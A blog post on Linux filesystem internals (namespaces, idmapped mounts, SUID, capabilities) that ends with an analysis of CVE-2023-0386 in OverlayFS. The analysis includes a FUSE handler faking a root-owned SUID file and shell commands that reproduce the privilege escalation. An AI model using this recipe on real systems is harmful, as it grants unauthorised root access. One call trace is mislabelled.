@@ -1,0 +1,572 @@
+---
+layout: post
+title:  "Filesystem 102"
+categories: Linux
+---
+
+In [Filesystem 101]({% post_url 2026-02-26-filesystem-101 %}), we covered the structural relationships of the Linux filesystem from a process perspective. In this post, we continue analyzing how it interacts with other kernel subsystems.
+
+## 1. Isolation
+
+### 1.1. chroot, chdir and pivot_root
+
+The kernel always call `path_openat()` to resolve pathname and obtain the corresponding `path` object. This function determines the lookup starting directory based on `current->fs`, which is an `fs_struct` object containing the process's **current working path** and **root path** information.
+
+For example, if pathname starts with `"/"`, `current->fs->root` is used; if pathname specifies `AT_FDCWD` as the directory file descriptor, `current->fs->cwd` is used.
+
+``` c
+struct fs_struct {
+    int users;
+    seqlock_t seq;
+    int umask;
+    int in_exec;
+    struct path root, pwd;
+} __randomize_layout;
+```
+
+There are some syscalls able to configure these directories information: `chroot`, `chdir` and `pivot_root`.
+
+The syscall `chroot` simply resolves the provided pathname and updates **`current->fs->root`**, but it requires the process to have the **`CAP_SYS_CHROOT` capability** in its user namespace.
+
+```
+__do_sys_chroot(filename)
+=> user_path_at(AT_FDCWD, filename, lookup_flags, &path)
+=> check ns_capable(current_user_ns(), CAP_SYS_CHROOT)
+=> set_fs_root(current->fs, &path)
+  => fs->root = *path
+```
+
+The syscall `chdir` resolves pathname and updates the working directory, **`current->fs->pwd`**. Unlike `chroot`, it requires no capability.
+
+```
+__do_sys_chroot(filename)
+=> user_path_at(AT_FDCWD, filename, lookup_flags, &path)
+=> set_fs_pwd(current->fs, &path)
+  => fs->pwd = *path
+```
+
+The syscall `pivot_root` is the most complicated one. It is used to update the **entire mount system** rather than only the root directory or working directory. It requires the `CAP_SYS_ADMIN` capability and performs a lot of checks before updating. After these checks, it iterates over all processes and threads, finds those tasks whose **working directory or root directory matches the old ones**, and updates them to the new ones.
+
+The whole process not only updates `current->fs`, but also involves **mount point validation** and **namespace handling**. Therefore, when setting up containers, `pivot_root` should be used to properly isolate execution environments.
+
+```
+__do_sys_pivot_root(new_root, put_old)
+=> may_mount()
+  => ns_capable(current->nsproxy->mnt_ns->user_ns, CAP_SYS_ADMIN)
+
+=> user_path_at(AT_FDCWD, new_root, LOOKUP_FOLLOW | LOOKUP_DIRECTORY, &new)
+=> user_path_at(AT_FDCWD, put_old, LOOKUP_FOLLOW | LOOKUP_DIRECTORY, &old)
+=> get_fs_root(current->fs, &root)
+=> ... lots of check
+
+=> chroot_fs_refs(&root, &new)
+  => iterate all process and thread
+    => fs = p->fs
+    
+    => replace_path(&fs->root, old_root, new_root)
+      => if fs->root == old_root
+        => fs->root = new_root
+    
+    => replace_path(&fs->pwd, old_root, new_root)
+```
+
+### 1.2. CLONE_FS and CLONE_NEWNS
+
+The kernel supports the system calls `unshare` and `clone` to create namespaces, isolating processes in different execution environments. In this post, we only discuss the `unshare` case, as the `clone` operation is largely similar.
+
+The goal of the `unshare` syscall is to create a **namespace proxy** for a process. The namespace proxy is then installed with newly created namespaces. The simplified call trace is shown below; only function calls relevant to the later discussion are included.
+
+```
+__do_sys_unshare(unshare_flags)
+=> ksys_unshare(unshare_flags)
+  => unshare_fs(unshare_flags, &new_fs)
+  => ...
+  
+  => unshare_nsproxy_namespaces(unshare_flags, &new_nsproxy, new_cred, new_fs)
+    => create_new_namespaces(unshare_flags, current, user_ns, new_fs ? new_fs : current->fs)
+      => new_nsp = create_nsproxy()
+      => new_nsp->mnt_ns = copy_mnt_ns(flags, tsk->nsproxy->mnt_ns, user_ns, new_fs)
+      => ...
+  
+  => switch_task_namespaces(current, new_nsproxy)
+    => p->nsproxy = new
+```
+
+Among all flags, two are directly related to the filesystem.
+
+The first is **`CLONE_FS`**, It is used to **duplicate the current `fs_struct` object (`current->fs`)** so that updates to the root directory and the working directory can be performed without affecting other processes.
+
+`unshare_fs()` is called during the unsharing process. It creates a new `fs_struct` object, and all subsequent filesystem updates are performed on this new object instead of `current->fs`. Finally, if all operations complete successfully, `current->fs` is replaced with the new instance.
+
+```
+unshare(unshare_flags)
+=> ...
+=> unshare_fs(unshare_flags, new_fsp)
+  => *new_fsp = copy_fs_struct(fs)
+    => fs = kmem_cache_alloc(fs_cachep)
+    => fs->root = old->root
+    => fs->pwd = old->pwd
+=> ...
+=> current->fs = new_fs
+```
+
+The second flag is **`CLONE_NEWNS`**. It is used to create a **new mount namespace**, allowing the process to have a private copy of the current filesystem that is not shared with other processes.
+
+Internally, `copy_mnt_ns()` creates a new mount namespace (`new_ns`), duplicates the current filesystem tree from the root as a private tree, and then binds the new root to the newly created mount namespace object. It also needs to **update `fs->root` and `fs->pwd`** so that they point to the new tree; otherwise, filesystem isolation would be broken.
+
+```
+create_new_namespaces(flags, tsk, user_ns, new_fs)
+=> new_nsp = create_nsproxy()
+=> new_nsp->mnt_ns = copy_mnt_ns(flags, tsk->nsproxy->mnt_ns, user_ns, new_fs)
+  => old = ns->root
+  => new_ns = alloc_mnt_ns(user_ns, false)
+  => new = copy_tree(old, old->mnt.mnt_root, copy_flags)
+  => new_ns->root = new
+  
+  => traverse the trees
+    => if (&p->mnt == new_fs->root.mnt)
+      => new_fs->root.mnt = mntget(&q->mnt)
+    => if (&p->mnt == new_fs->pwd.mnt)
+      => new_fs->pwd.mnt = mntget(&q->mnt)
+```
+
+## 2. Permission Model
+
+### 2.1. Operation Check
+
+Before performing file-related operations, the kernel always call functions following the **`may_XXX()` naming convention** to verify **whether a process has sufficient permissions**.
+
+For example, since mounting may affect the entire system, the process is required to have the `CAP_SYS_ADMIN` capability in the corresponding user namespace. This check is performed by **`may_mount()`**.
+
+``` c
+bool may_mount(void)
+{
+    return ns_capable(current->nsproxy->mnt_ns->user_ns, CAP_SYS_ADMIN);
+}
+```
+
+Opening files is a more common case. Before reading, writing or executing a file, **`may_open()`** is invoked to check if the process has the required **access permissions**. The key function responsible for permission checking is `acl_permission_check()`. 
+
+It first retrieves the file mode from **`inode->i_mode`**, which corresponds to the permission bits (e.g., `-rw-r--r--`) shown in the output of the `ls -al` command. This value defines which users are allowed to access the file and with what permissions.
+
+```
+may_open(idmap, path, acc_mode, flag)
+=> inode_permission(idmap, inode, MAY_OPEN | acc_mode)
+  => do_inode_permission(idmap, inode, mask)
+    => generic_permission(idmap, inode, mask)
+      => acl_permission_check(idmap, inode, mask)
+        => mode = inode->i_mode
+        => vfsuid = i_uid_into_vfsuid(idmap, inode)
+        => ... check
+        => vfsgid = i_gid_into_vfsgid(idmap, inode)
+        => ... check
+```
+
+It looks very straightforward: retrieving the access mode and checking the identifiers against that mode.
+
+But what are `i_uid_into_vfsuid()` and `i_gid_into_vfsgid()`? What is the difference between a UID (`uid`) and a VFS UID (`vfsuid`)?
+
+Basically, every file stores its **owner and group information** in its `inode` object, namely `inode->i_uid` and `inode->i_gid`. However, due to the namespace mechanism, the same UID or GID value may correspond to different users in different user namespaces. Therefore, these identifiers must be **converted into meaningful values** before being used for permission checks.
+
+This conversion is performed by `i_uid_into_vfsuid()` and `i_gid_into_vfsgid()`. Corresponding inverse conversion functions, `mapped_fsuid()` and `mapped_fsgid()`, are also provided.
+
+Here, we only analyze the UID conversion path, as the GID handling follows the same mechanism.
+
+If the idmap (`idmap`) points to the dummy one (`&nop_mnt_idmap`), the kernel simply **returns `inode->i_uid` as the VFS UID value**. Otherwise, it **looks up the corresponding VFS UID from the idmap (`idmap->uid_map`)** using the UID in the user namespace rather than the init namespace.
+
+```
+i_uid_into_vfsuid(idmap, inode)
+=> make_vfsuid(idmap, i_user_ns(inode), inode->i_uid)
+  => if (idmap == &nop_mnt_idmap)
+    => return VFSUIDT_INIT(kuid)
+  
+  => uid = from_kuid(fs_userns, kuid)
+  => return VFSUIDT_INIT_RAW(map_id_down(&idmap->uid_map, uid))
+```
+
+The idmap is a member of the `vfsmount` structure and is used to map user IDs between namespaces.
+
+``` c
+struct vfsmount {
+    struct dentry *mnt_root;       /* root of the mounted tree */
+    struct super_block *mnt_sb;    /* pointer to superblock */
+    int mnt_flags;
+    struct mnt_idmap *mnt_idmap;
+} __randomize_layout;
+```
+
+By default, the idmap of a `mount` object is set to `&nop_mnt_idmap`.
+
+```
+alloc_vfsmnt(name)
+=> mnt = kmem_cache_zalloc(mnt_cache)
+=> mnt->mnt.mnt_idmap = &nop_mnt_idmap
+=> return mnt
+```
+
+A process can set the idmap of a specific mount point to that of a user namespace using the **`mount_setattr` syscall** (the `open_tree_attr` syscall can also be used).
+
+Internally, `build_mount_idmapped()` retrieves the user namespace object from the given `userns_fd`, which is a file descriptor obtained by opening file `"/proc/<pid>/ns/user"`. After that, the UID (`mnt_userns->uid_map`) and GID (`mnt_userns->gid_map`) mappings of the user namespace are duplicated and assigned to the mount point's idmap (`mnt->mnt.mnt_idmap`).
+
+```
+__do_sys_mount_setattr(dfd, path, flags, uattr, usize)
+=> wants_mount_setattr(uattr, usize, &kattr)
+  => copy_struct_from_user(&attr, sizeof(attr), uattr, usize)
+  => build_mount_kattr(&attr, usize, kattr)
+    => build_mount_idmapped(attr, usize, kattr)
+      => CLASS(fd, f)(attr->userns_fd)
+      => ns = get_proc_ns(file_inode(fd_file(f)))
+      => mnt_userns = container_of(ns, struct user_namespace, ns)
+      => kattr->mnt_userns = get_user_ns(mnt_userns)
+
+=> user_path_at(dfd, path, kattr.lookup_flags, &target)
+
+=> do_mount_setattr(&target, &kattr)
+  => mnt_idmap = alloc_mnt_idmap(kattr->mnt_userns)
+    => copy_mnt_idmap(&mnt_userns->uid_map, &idmap->uid_map)
+    => copy_mnt_idmap(&mnt_userns->gid_map, &idmap->gid_map)
+
+  => kattr->mnt_idmap = mnt_idmap
+  => mount_setattr_commit(kattr, mnt)
+    => do_idmap_mount(kattr, m)
+      => smp_store_release(&mnt->mnt.mnt_idmap, mnt_idmap_get(kattr->mnt_idmap))
+```
+
+At this point, we know that a mount idmap is essentially derived from **the idmap of a user namespace**. In the next section, we will explain how to create an idmap and how the mapping works.
+
+### 2.2. UID & GID mappings
+
+The user and group identifiers of a process are stored in `current->cred`, which is a `cred` object. 
+
+``` c
+struct cred {
+    // [...]
+    kuid_t uid;   /* real UID of the task */
+    kgid_t gid;   /* real GID of the task */
+    kuid_t suid;  /* saved UID of the task */
+    kgid_t sgid;  /* saved GID of the task */
+    kuid_t euid;  /* effective UID of the task */
+    kgid_t egid;  /* effective GID of the task */
+    kuid_t fsuid; /* UID for VFS ops */
+    kgid_t fsgid; /* GID for VFS ops */
+    // [...]
+};
+```
+
+When it comes to user namespace, how does the kernel save the real UID and GID of a process?
+
+Well, if we examine the implmentation of `unshare_userns()`, we can see that it simply duplicates the current `cred` object, configure a new user namespace object (`ns`), and finally associates the `cred` with that namespace, **without modifying the UID or GID information**!
+
+```
+unshare_userns(unshared_flags, new_cred)
+=> cred = prepare_creds()
+=> create_user_ns(cred)
+  => ns = kmem_cache_zalloc(user_ns_cachep)
+  => set_cred_user_ns(new, ns)
+=> *new_cred = cred
+```
+
+This implies that the `cred` structure always preserves the real UID and GID. So, there must be another place that stores the UID and GID mapping information for each user namespace.
+
+<br>
+
+We can identify where the mapping information is stored by examining the behavior of the `getuid` system call.
+
+When `getuid()` is invoked immediately after unsharing into a new user namespace, the returned value may be `65534` (the `"nobody"` user). This happens when the UID **cannot be mapped through the namespace's UID mapping** (`targ->uid_map`) during the lookup performed by `map_id_range_up()`.
+
+```
+__do_sys_getuid()
+=> from_kuid_munged(current_user_ns(), current_uid())
+  => uid = from_kuid(to, kuid)
+    => map_id_up(&targ->uid_map, __kuid_val(kuid))
+      => map_id_range_up(map, id, 1)
+        => extent = map_id_range_up_base(extents, map, id, count)
+        => if (!extent)
+          => id = -1
+  
+  => if (uid == -1)
+    => uid = overflowuid // 65534
+```
+
+Obviously, a user namespace maintains its own UID mapping (`targ->uid_map`), and this mapping is used to convert UIDs or GIDs within that user namespace into real UIDs (KUIDs) or GIDs (KGIDs), and vice versa.
+
+Here comes another question: what data does the mapping actually store, and how does a process configure the mapping?
+
+The file `/proc/<pid>/uid_map` allows user to insert new mapping entries into `ns->uid_map`. Each entry follows the format `<first> <lower_first> <count>`, where `<first>` represents the **first mapped UID in the current user namespace**, `<lower_first>` represents the **corresponding UID in the parent namespace**, and `<count>` specifies the **size of the mapping range**.
+
+For example, the entry `"0 1000 1"` means that UID `1000` in the parent user namespace is mapped to UID `0` in the current user namespace.
+
+When writing mapping entries to `/proc/<pid>/uid_map`, `proc_uid_map_write()` is triggered. It parses the input data and converts it into internal structures. Finally, the new mapping (`new_map.extent`) is copied to `ns->uid_map`, completing the idmap setup.
+
+```
+proc_uid_map_write(file, buf, size, ppos)
+=> map_write(file, buf, size, ppos, CAP_SETUID, &ns->uid_map, &ns->parent->uid_map)
+  => extent.first = simple_strtoul(pos, &pos, 10)
+  => extent.lower_first = simple_strtoul(pos, &pos, 10)
+  => extent.count = simple_strtoul(pos, &pos, 10)
+  => insert_extent(&new_map, &extent)
+    => dest = &map->extent[map->nr_extents]
+    => *dest = *extent
+  
+  => new_idmap_permitted(file, map_ns, cap_setid, &new_map)
+
+  => memcpy(map->extent, new_map.extent, new_map.nr_extents * sizeof(new_map.extent[0]))
+  => map->nr_extents = new_map.nr_extents
+```
+
+At first glance, this mechanism may appear fragile since the user can manipulate the mapping. In practice, however, `new_idmap_permitted()` strictly validates all entries, including capability check and whether the requested UID range is permitted.
+
+<br>
+
+To summarize the idmap mechanism, let's go back to `make_vfsuid()`, which we mentioned in the last section. It is used to map a KUID (the UID stored in the `inode` object) to a UID in the corresponding user namespace.
+
+The inverse function is `from_vfsuid()`. It is used to map a UID in the user namespace back to the real UID (the UID in initial user namespace).
+
+```
+  +----------------+        +----------------+
+  | inode->i_uid   |        | target user ns |
+  | (init user ns) |        |                |
+  |                |        |                |
+  |       1000     |        |        0       |
+  +--------+-------+        +--------+-------+
+           |                         |
+           | make_vfsuid()           | from_vfsuid()           path
+           v                         v                           |
+        +------------- idmap ------------+                       | (mnt)
+        |    ns_uid  host_uid  range     |                       v
+        |       0      1000      1       |   <-------------  vfsmount
+        |  (first) (lower_first) (count) |     (mnt_idmap)
+        +--------------------------------+
+           |                         |
+           v                         v
+           0                        1000
+```
+
+### 2.3. SUID
+
+Some of the kernel mechanisms can grant files special permissions; one of the most common is the SUID bit.
+
+``` bash
+chmod u+s ./file
+```
+
+In fact, both the SUID and SGID bits are **stored in `inode->i_mode`** as bit flags: `S_ISUID` (`0004000`) and `S_ISGID` (`0002000`).
+
+Internally, the `chmod` syscall invokes the `.setattr` handler of the inode (`inode->i_op->setattr`) and updates the `inode->i_mode` with the new mode value.
+
+```
+__do_sys_chmod
+=> do_fchmodat()
+  => do_fchmodat(AT_FDCWD, filename, mode, 0)
+    => user_path_at(dfd, filename, lookup_flags, &path)
+      => chmod_common(&path, mode)
+        => notify_change(mnt_idmap(path->mnt), path->dentry, &newattrs, &delegated_inode)
+          => may_setattr(idmap, inode, ia_valid)
+            => inode->i_op->setattr(idmap, dentry, attr)
+              => ...
+              => mode = attr->ia_mode
+              => inode->i_mode = mode
+```
+
+These two bits are retrieved when an executable is run. The `execve` syscall invokes `bprm_creds_from_file()` to handle the **process credentials**. It then calls `bprm_fill_uid()` to check the file's SUID bit. If the kernel detects that the SUID bit is set, it retrieves `inode->i_uid`, map it to a KUID, and finally **assigns it to the `cred` object (`bprm->cred->euid`)**.
+
+```
+bprm_creds_from_file(brpm)
+=> file = bprm->execfd_creds ? bprm->executable : bprm->file
+
+=> bprm_fill_uid(bprm, file)
+  => inode = file_inode(file)
+  => ...
+   => vfsuid = i_uid_into_vfsuid(idmap, inode)
+  => bprm->cred->euid = vfsuid_into_kuid(vfsuid)
+
+=> security_bprm_creds_from_file(bprm, file)
+```
+
+### 2.4. Capability
+
+The capability is also one of the mechanisms that allows a user to grant higher privileges.
+
+``` bash
+setcap cap_setuid+ep ./test
+```
+
+These capabilities are actually stored as **extended attributes (EAs)**. When the kernel detects that the EA name is **`"security.capability"`**, it first calls `cap_convert_nscap()` to verify whether the process has sufficient privileges to set capabilities on the file. It then invokes the filesystem's set handler (`handler->set`) to **persistently store the EA**.
+
+```
+__do_sys_setxattr(dfd, pathname, at_flags, name, uargs, usize)
+=> path_setxattrat(AT_FDCWD, pathname, 0, name, value, size, flags)
+  => setxattr_copy(name, &ctx)
+    => import_xattr_name(ctx->kname, name)
+    => ctx->kvalue = vmemdup_user(ctx->cvalue, ctx->size)
+
+  => filename_setxattr(dfd, filename, lookup_flags, &ctx)
+    => filename_lookup(dfd, filename, lookup_flags, &path, NULL)
+    => do_setxattr(file_mnt_idmap(f), f->f_path.dentry, ctx)
+      => vfs_setxattr(idmap, dentry, ctx->kname->name, ctx->kvalue, ctx->size, ctx->flags)
+        
+        => if name == "security.capability"
+          => cap_convert_nscap(idmap, dentry, &value, size)
+        
+        => __vfs_setxattr_locked(idmap, dentry, name, value, size, flags, &delegated_inode)
+          => __vfs_setxattr_noperm(idmap, dentry, name, value, size, flags)
+            => __vfs_setxattr(idmap, dentry, inode, name, value, size, flags)
+              => handler = xattr_resolve_name(inode, &name)
+              => handler->set(handler, idmap, dentry, inode, name, value, size, flags)
+```
+
+Like the SUID bit, capabilities are also handled during the `execve` syscall.
+
+Within `bprm_creds_from_file()`, `security_bprm_creds_from_file()` is called to handle the capability-related logic. It gets the EA named `"security.capability"` (`XATTR_NAME_CAPS`) from the executable file and **updates the permitted capability set of the `cred` object** (`new->cap_permitted`) based on the EA value.
+
+```
+bprm_creds_from_file(brpm)
+=> file = bprm->execfd_creds ? bprm->executable : bprm->file
+=> bprm_fill_uid(bprm, file)
+
+=> security_bprm_creds_from_file(bprm, file)
+  => cap_bprm_creds_from_file(bprm, file)
+    => get_file_caps(bprm, file, &effective, &has_fcap)
+      => get_vfs_caps_from_disk(file_mnt_idmap(file), file->f_path.dentry, &vcaps)
+        => __vfs_getxattr((struct dentry *)dentry, inode, XATTR_NAME_CAPS, &data, XATTR_CAPS_SZ)
+        => ... set vcaps
+    
+      => bprm_caps_from_vfs_caps(&vcaps, bprm, effective, has_fcap)
+        => new = bprm->cred
+        => ... set new->cap_permitted.val
+```
+
+## 3. Security Issues
+
+### CVE-2023-0386: ovl: fail on invalid uid/gid mapping at copy up
+> https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f11ada10d0ad3fd53e2bd67806351de63a4f9c3
+
+I think this is one of the most famous and impactful logical bugs that has occured in filesystems in recent years.
+
+This vulnerability occurs in the kernel function `ovl_copy_up_one()`, which is used by OverlayFS to **copy a file from a lower directory to an upper directory**.
+
+``` diff
+@@ -1011,6 +1011,10 @@ static int ovl_copy_up_one(struct dentry *parent, struct dentry *dentry,
+    if (err)
+       return err;
+ 
++   if (!kuid_has_mapping(current_user_ns(), ctx.stat.uid) ||
++       !kgid_has_mapping(current_user_ns(), ctx.stat.gid))
++      return -EOVERFLOW;
++
+```
+
+OverlayFS can be viewed as one of the core mechanisms of **Docker containers**, so the [Docker documentation](https://docs.docker.com/engine/storage/drivers/overlayfs-driver/) elaborates on it in much more detail. Here, I only cover some core concepts and analyze the functions related to the vulnerability.
+
+<br>
+
+An OverlayFS instance consists of multiple lower directories, an upper directory and a merged directory.
+
+Basically, these **lower directories** contain files that are shared by all containers (or instances) and **cannot be modified (read-only)**. The **merged directory** is a flattened view of all lower directories. If there are conflicting files between lower directories, the one with the highest layer takes precedence.
+
+If a user tries to create new files or modify existing ones, OverlayFS will duplicate target files or create new files if they do not exist in the **upper directory**, which is a writeable directory. The upper directory stores the unique files for each containers and has higher priority than all lower directories.
+
+The `ovl_copy_up_one()` function is used to handle the file copy **from the lower directory to the upper directory**.
+
+```
+ovl_open(inode, file)
+=> ovl_maybe_copy_up(dentry, file->f_flags)
+  => ovl_copy_up_flags(dentry, flags)
+    => ovl_copy_up_one(parent, next, flags)
+```
+
+It first gets the `path` object of the lower directory using `ovl_path_lower()` [1]. After that, `vfs_getattr()` [2] is called to retrieve the file metadata, including the UID and GID.
+
+Before the patch, the kernel failed to verify whether there was **a mapping between the real UID/GID and the current user namespace** [3].
+
+``` c
+static int ovl_copy_up_one(struct dentry *parent, struct dentry *dentry,
+               int flags)
+{
+    // [...]
+    struct path parentpath;
+    // [...]
+    ovl_path_lower(dentry, &ctx.lowerpath); // [1]
+    err = vfs_getattr(&ctx.lowerpath, &ctx.stat, // [2]
+              STATX_BASIC_STATS, AT_STATX_SYNC_AS_STAT);
+
+    // if (!kuid_has_mapping(current_user_ns(), ctx.stat.uid) || // [3]
+    //     !kgid_has_mapping(current_user_ns(), ctx.stat.gid))
+    //     return -EOVERFLOW;
+    // [...]
+}
+```
+
+Since OverlayFS requires a process to have root privileges in the user namespace, the process must call `unshare` before mounting OverlayFS. Within a new user namespace, there is no mapping entry for the real root user, so the real root user is shown as `"nobody"` (`65534`) in that user namespace.
+
+However, files owned by `"nobody"` are still duplicated by `ovl_copy_up_one()` with **all file metadata preserved**.
+
+We may just pass the directory containing a SUID root executable (like `su` or `passwd`) as the lower directory and hijack its file content after copy. However, the write handler internally calls `file_remove_privs()` to **remove the SUID bit** and **update capabilities of the file**.
+
+```
+ovl_write_iter(iocb, iter)
+=> realfile = ovl_real_file(file)
+=> backing_file_write_iter(realfile, iter, iocb, ifl, &ctx)
+  => ret = file_remove_privs(iocb->ki_filp)
+    => file_remove_privs_flags(file, 0)
+```
+
+So how can we create a file initial namespace whose content is controlled, owned by root, and has the SUID bit set? That's where the **FUSE filesystem** comes in!
+
+If we use FUSE as one of our lower directories, the filesystem implementation allows us to fully control the file `stat` return value, including `ctx.stat.uid` and `ctx.stat.gid`. We can also set the SUID bit for that file.
+
+To archieve this, we define the `.getattr` handler as the `my_getattr()` function shown below in FUSE daemon.
+
+``` c
+static int my_getattr(const char *path, struct stat *stbuf)
+{
+    memset(stbuf, 0, sizeof(struct stat));
+
+    if (strcmp(path, "/") == 0) {
+        stbuf->st_mode = S_IFDIR | 0755;
+        stbuf->st_nlink = 2;
+        return 0;
+    }
+
+    if (strcmp(path, file_path) == 0) {
+        stbuf->st_mode = S_IFREG | 04777; // 04000 == SUID
+        stbuf->st_nlink = 1;
+        stbuf->st_size = strlen(file_content);
+
+        stbuf->st_uid = 0; // root
+        stbuf->st_gid = 0; // root
+        return 0;
+    }
+
+    return -ENOENT;
+}
+```
+
+After opening the target file (`file_path`), `ovl_copy_up_one()` copies it from the lower directory (FUSE) to the upper directory (ext4) while preserving the SUID bit. We can then go back to initial user namespace and executable the SUID binary to get the root shell!
+
+In fact, the reason you are allowed to mount the FUSE filesystem in the **initial user namespace** is that after installing the `libfuse-dev` package, the executable `fusermount3` is also installed, and it **has the SUID bit**! As a result, even a normal user without the `CAP_SYS_ADMIN` capability can still mount a FUSE filesystem.
+
+``` bash
+-rwsr-xr-x 1 root root 39376 Sep 21  2024 /usr/bin/fusermount3
+```
+
+However, it also appears that this vulnerability **depends on external pacakges** and cannot be exploited by default. That may be why it is not as broadly applicable as DirtyPipe or DirtyCOW.
+
+<br>
+
+You can use the following command lines to reproduce this vulnerability yourself.
+
+``` bash
+mkdir -p overlay-test/{lower,upper,work,merged}
+./your_fuse overlay-test/lower # write your fuse program with the getattr handler above
+
+unshare -r -n -m /bin/bash
+mount -t overlay overlay -o lowerdir=overlay-test/lower,upperdir=overlay-test/upper,workdir=overlay-test/work overlay-test/merged
+
+exec 3>> overlay-test/merged/aaa # aaa == file_path
+ls -al overlay-test/upper/
+
+# [output]
+# ...
+# -rwsrwxrwx 1 nobody nogroup   33 Jan  1  1970 aaa
+```
